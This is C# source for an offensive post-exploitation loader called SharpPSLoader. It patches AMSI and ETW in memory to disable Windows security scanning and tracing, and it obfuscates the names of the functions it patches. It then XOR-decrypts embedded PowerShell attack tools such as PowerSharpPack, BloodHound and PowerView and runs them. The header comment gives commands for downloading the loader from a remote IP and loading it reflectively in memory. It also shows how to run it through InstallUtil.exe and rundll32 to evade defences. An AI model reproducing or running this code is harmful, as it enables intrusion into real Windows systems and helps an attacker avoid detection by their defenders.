using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;


/*
 * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
 *      
 *      
 * Adding Resources 
 *  - Project > Properties > Add Resources > Access Modifier = Public 
 *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
 *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
 *  - Thought about adding powershell scripts, decided to just yoink powersharppack and call it a day 
 *  
 * Usage: 
 *  - Console
 *      .\SharpPSLoaderConsole.exe 1 powersharppack -seatbelt -command "-group=user"
 *      
 *  - In-memory (Obfuscated, Non-obfuscated)
 *      $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoader.exe")
 *      [System.Reflection.Assembly]::Load($b)
 *      [SharpPSLoaderLibrary.SharpPSLoaderLibrary]::Main(@("1","Powersharppack -sharpup audit"))
 * 
 *  - LOLBAS - InstallUtils.exe 
 *      C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderLibrary.exe
 *      
 *  - Library - rundll32.exe 
 *      c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
 *  
 *      (64bit) c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
 *      (32bit) C:\Windows\SysWOW64\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user
 * 
 * */

namespace SharpPSLoaderConsole
{
    public class SharpPSLoaderConsole
    {

        public Dictionary<string, byte[]> resourceDict = ParseResources();

        /// <summary>
        /// XOR Decrypt powershell byte array payload with key and return raw powershell payload
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="singleByteKey">Default xor decrypt key is 0x6f = 111</param>
        /// <returns>resultStr, powershell string</returns>
        public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
        {
            byte[] result = new byte[payload.Length];
            for (int i = 0; i < payload.Length; i++)
            {
                result[i] = (byte)(payload[i] ^ singleByteKey);
            }

            var resultStr = Encoding.UTF8.GetString(result);

            return resultStr;
        }

        // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
        /// <summary>
        /// Parse resources from assembly and create a dictionary of <string, byte[]> where string = Name, byte[] = Encrypted powershell payload.
        /// </summary>
        /// <returns>resourceDict</returns>
        public static Dictionary<string, byte[]> ParseResources()
        {
            Dictionary<string, byte[]> resourceDict = new Dictionary<string, byte[]>();

            // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
            List<string> resourceNames = new List<string>();
            foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
            {
                resourceDict[property.Name.ToLower()] = (byte[])(property.GetValue(null, null));
            }
            return resourceDict;
        }

        /// <summary>
        /// Decrypt powershell payload from the resources dictioanry and return the raw powershell payload 
        /// </summary>
        /// <param name="resourceDict"></param>
        /// <param name="payload"></param>
        /// <returns>decPowershell</returns>
        public string DecryptedPSFromRsrcDict(Dictionary<string, byte[]> resourceDict, string payload)
        {
            // 1. Return encrypted powershell payload byte array 
            byte[] encPayload = new byte[] { };

#if DEBUG
            Console.WriteLine("[+] payload = {0}", payload);
#endif

            // 1 = PowerSharpPack 2. Bloodhound 3. Powerview 
            switch (payload.Trim().ToLower())
            {
                case "1":
                    encPayload = resourceDict.Where(a => a.Key.Contains("arppac")).Select(a => a.Value).First();
                    break;
                case "2":
                    encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
                    break;
                case "3":
                    encPayload = resourceDict.Where(a => a.Key.Contains("wervi")).Select(a => a.Value).First();
                    break;
                default:
                    break;
            }

            // 2. Decrypt the byte array, and return the raw powershell payload 
            string decPowershell = DecryptAndStringReturn(encPayload);

            return decPowershell;
        }

        public static string ParseFunctionName(string payload)
        {
            var lines = payload.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            string functionName = "";
            foreach (var line in lines)
            {
                //Console.WriteLine(line);
                if (line.ToLower().Contains("function"))
                {
                    functionName = line.Split(' ')[1].Trim().Replace("{", "");
                    break;
                }
            }

            return functionName;
        }

        public static bool is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        // Return required bytes for patching 
        public static byte[] GetPatchBytes(string function)
        {
            byte[] patch;
            List<byte> patchList = new List<byte>();
            if (function.ToLower() == "bypasstw")
            {
                if (is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }

                // Returning for bypassEtw 
                return patch;
            }

            else if (function.ToLower() == "bypasssi")
            {

                if (is64Bit)
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC3);
                    patchList.RemoveAll(b => b == 0x90);
                }
                else
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC2);
                    patchList.Add(0x90);
                    patchList.Add(0x18);
                    patchList.Add(0x00);
                    patchList.RemoveAll(b => b == 0x90);
                }

                var patchArr = patchList.ToArray();
                return patchArr;
            }

            else
            {
                throw new ArgumentException("[-] Incorrect function name argument");
            }
        }

        public void bypassTW()
        {
            string susLibraryZ = "nZtZdZlZlZ.dZlZlZ";
            string magicFunctionZ = "EZZtZwZEZvZeZnZtZWZrZiZtZe";
            string susLibrary = susLibraryZ.Replace("Z", "");
            string magicFunction = magicFunctionZ.Replace("Z", "");

            IntPtr ntdllAddr = LoadLibrary(susLibrary);
            IntPtr etwWriteEventAddr = GetProcAddress(ntdllAddr, magicFunction);

            byte[] magicVoodoo = GetPatchBytes("bypasstw");

            // out uint oldProtect is a nice trick, never knew that 
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, etwWriteEventAddr, magicVoodoo.Length);
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

#if DEBUG
            Console.WriteLine("[+] Disabled ETW Tracing");
#endif
        }

        public void bypassSI()
        {
            string amsidllZ = "Za" + "mZsZi" + "Z.ZdZ" + "Zll";
            string amsiScanBufferZ = "AZm" + "siSZZc" + "aZnZB" + "uZfZfZer";

            string amsiDll = amsidllZ.Replace("Z", "");
            string amsiScanBuffer = amsiScanBufferZ.Replace("Z", "");

            IntPtr amsidllAddr = LoadLibrary(amsiDll);
            IntPtr amsiScanBufferAddr = GetProcAddress(amsidllAddr, amsiScanBuffer);

            byte[] magicVoodoo = GetPatchBytes("bypasssi");

            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, amsiScanBufferAddr, magicVoodoo.Length);
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

#if DEBUG
            Console.WriteLine("[+] Disabled AMSI");
#endif
        }

        public void RunPowershell(string payload, string argument = "")
        {
            argument = argument.TrimStart();
#if DEBUG
            Console.WriteLine("[+] User argument = {0}", argument);
#endif
            string cmd = payload;
            cmd += ";";
            cmd += argument;

#if DEBUG
            // Uncomment to see raw powershell payload string in console 
            //Console.WriteLine(cmd);
#endif

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            var results = ps.Invoke();

            // Result is 0, powershell errored out. 
            if (results.Count == 0)
            {
                Console.WriteLine("[-] Powershell returned error");
                return;
            }

            // Result is not 0, at least something returned. Write all output and yeet out. 
            foreach (var obj in results)
            {
                if (obj != null)
                {
                    Console.WriteLine(obj.BaseObject.ToString());
                }
            }

            rs.Close();
        }

        // Empty constructor for now 
        public SharpPSLoaderConsole()
        {

        }

        // -------------------------------------------------------------------------------------------------
        // Main function for executing SharpPSLoader in console 
        // -------------------------------------------------------------------------------------------------
        public static void Main(string[] args)
        {
            SharpPSLoaderConsole psLoader = new SharpPSLoaderConsole();
            psLoader.bypassSI();
            psLoader.bypassTW();

            // Parse argument 
            string powershellPayload = "";
            if (args[0] != null)
            {
                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, args[0]);
            }

            string argument = String.Join(" ", args.Skip(1));

            psLoader.RunPowershell(powershellPayload, argument);
        }


        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);
    }



    // -------------------------------------------------------------------------------------------------
    // Uninstall function to execute SharpPSLoader through InstallUtil.exe 
    // -------------------------------------------------------------------------------------------------

    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoader.exe

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(IDictionary savedState)
        {
            SharpPSLoaderConsole psLoader = new SharpPSLoaderConsole();

            // Are these two needed, when I'm executing through cmd + lolbas? 
            psLoader.bypassSI();
            psLoader.bypassTW();

            // Parse argument 
            var userArg = this.Context.Parameters["p"].ToString();
            string payload = userArg.Split(' ')[0];
            int spaceIndex = userArg.IndexOf(' ');
            string argument = userArg.Substring(spaceIndex, userArg.Length - 1);


            string powershellPayload = "";
            if (payload != null)
            {
                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
            }


            psLoader.RunPowershell(powershellPayload, argument);

        }
    }


}

